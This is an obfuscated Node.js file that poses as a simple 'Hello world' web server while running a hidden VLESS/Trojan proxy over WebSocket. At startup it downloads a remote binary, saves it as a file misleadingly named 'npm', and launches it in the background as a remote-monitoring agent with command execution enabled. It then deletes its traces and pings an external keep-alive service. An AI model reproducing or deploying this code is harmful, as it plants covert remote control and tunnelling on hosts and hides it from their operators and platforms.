const os=require('os'),http=require('http'),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'CF0AFD39-F139-D060-680E-2DE53040839C',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process['env']['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],WSPATH=process['env']['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||'sub',NAME=process['env']['NAME']||'Hug',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{try{const C=await axios['get']('https://api.ip.sb/geoip'),Z=C['data'];ISP=(Z['country_code']+'-'+Z['isp'])['replace'](/ /g,'_');}catch(z){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((C,Z)=>{if(C['url']==='/'){const z=path['join'](__dirname,'index.html');fs['readFile'](z,'utf8',(K,q)=>{if(K){Z['writeHead'](0xc8,{'Content-Type':'text/html'}),Z['end']('Hello\x20world!');return;}Z['writeHead'](0xc8,{'Content-Type':'text/html'}),Z['end'](q);});return;}else{if(C['url']==='/'+SUB_PATH){const K=NAME?NAME+'-'+ISP:ISP,q='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+K,x='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+K,k=q+'\x0a'+x,v=Buffer['from'](k)['toString']('base64');Z['writeHead'](0xc8,{'Content-Type':'text/plain'}),Z['end'](v+'\x0a');}else Z['writeHead'](0x194,{'Content-Type':'text/plain'}),Z['end']('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(C){return new Promise((Z,z)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](C)){Z(C);return;}let K=0x0;function q(){if(K>=DNS_SERVERS['length']){z(new Error('Failed\x20to\x20resolve\x20'+C+'\x20with\x20all\x20DNS\x20servers'));return;}const x=DNS_SERVERS[K];K++;const k='https://dns.google/resolve?name='+encodeURIComponent(C)+'&type=A';axios['get'](k,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](v=>{const r=v['data'];if(r['Status']===0x0&&r['Answer']&&r['Answer']['length']>0x0){const w=r['Answer']['find'](V=>V['type']===0x1);if(w){Z(w['data']);return;}}q();})['catch'](v=>{q();});}q();});}function handleVlessConnection(C,Z){const [z]=Z,K=Z['slice'](0x1,0x11);if(!K['every']((w,V)=>w==parseInt(uuid['substr'](V*0x2,0x2),0x10)))return![];let q=Z['slice'](0x11,0x12)['readUInt8']()+0x13;const x=Z['slice'](q,q+=0x2)['readUInt16BE'](0x0),k=Z['slice'](q,q+=0x1)['readUInt8'](),v=k==0x1?Z['slice'](q,q+=0x4)['join']('.'):k==0x2?new TextDecoder()['decode'](Z['slice'](q+0x1,q+=0x1+Z['slice'](q,q+0x1)['readUInt8']())):k==0x3?Z['slice'](q,q+=0x10)['reduce']((w,V,B,T)=>B%0x2?w['concat'](T['slice'](B-0x1,B+0x1)):w,[])['map'](w=>w['readUInt16BE'](0x0)['toString'](0x10))['join'](':'):'';C['send'](new Uint8Array([z,0x0]));const r=createWebSocketStream(C);return resolveHost(v)['then'](w=>{net['connect']({'host':w,'port':x},function(){this['write'](Z['slice'](q)),r['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](r);})['on']('error',()=>{});})['catch'](w=>{net['connect']({'host':v,'port':x},function(){this['write'](Z['slice'](q)),r['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](r);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(C,Z){try{if(Z['length']<0x3a)return![];const z=Z['slice'](0x0,0x38)['toString'](),K=[UUID];let q=null;for(const B of K){const T=crypto['createHash']('sha224')['update'](B)['digest']('hex');if(T===z){q=B;break;}}if(!q)return![];let x=0x38;Z[x]===0xd&&Z[x+0x1]===0xa&&(x+=0x2);const k=Z[x];if(k!==0x1)return![];x+=0x1;const v=Z[x];x+=0x1;let r,w;if(v===0x1)r=Z['slice'](x,x+0x4)['join']('.'),x+=0x4;else{if(v===0x3){const g=Z[x];x+=0x1,r=Z['slice'](x,x+g)['toString'](),x+=g;}else{if(v===0x4)r=Z['slice'](x,x+0x10)['reduce']((p,D,f,F)=>f%0x2?p['concat'](F['slice'](f-0x1,f+0x1)):p,[])['map'](p=>p['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),x+=0x10;else return![];}}w=Z['readUInt16BE'](x),x+=0x2;x<Z['length']&&Z[x]===0xd&&Z[x+0x1]===0xa&&(x+=0x2);const V=createWebSocketStream(C);return resolveHost(r)['then'](p=>{net['connect']({'host':p,'port':w},function(){x<Z['length']&&this['write'](Z['slice'](x)),V['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](V);})['on']('error',()=>{});})['catch'](p=>{net['connect']({'host':r,'port':w},function(){x<Z['length']&&this['write'](Z['slice'](x)),V['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](V);})['on']('error',()=>{});}),!![];}catch(p){return![];}}wss['on']('connection',(C,Z)=>{const z=Z['url']||'';C['once']('message',K=>{if(K['length']>0x11&&K[0x0]===0x0){const q=K['slice'](0x1,0x11),x=q['every']((k,r)=>k==parseInt(uuid['substr'](r*0x2,0x2),0x10));if(x){!handleVlessConnection(C,K)&&C['close']();return;}}!handleTrojanConnection(C,K)&&C['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const C=os['arch']();return C==='arm'||C==='arm64'||C==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const C=getDownloadUrl(),Z=await axios({'method':'get','url':C,'responseType':'stream'}),z=fs['createWriteStream']('npm');return Z['data']['pipe'](z),new Promise((K,q)=>{z['on']('finish',()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',x=>{if(x)q(x);K();});}),z['on']('error',q);});}catch(K){throw K;}},runnz=async()=>{try{const z=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(z['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(K){}await downloadFile();let C='',Z=['443','8443','2096','2087','2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const q=Z['includes'](NEZHA_PORT)?'--tls':'';C='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+q+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const x=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',k=Z['includes'](x)?'true':'false',v='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+k+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync']('config.yaml',v);}C='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(C,{'shell':'/bin/bash'},r=>{if(r)console['error']('npm\x20running\x20error:',r);else console['log']('npm\x20is\x20running');});}catch(r){console['error']('error:\x20'+r);}};async function addAccessTask(){if(!AUTO_ACCESS)return;if(!DOMAIN)return;const C='https://'+DOMAIN;try{const Z=await axios['post']('https://oooo.serv00.net/add-url',{'url':C},{'headers':{'Content-Type':'application/json'}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(z){}}const delFiles=()=>{fs['unlink']('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
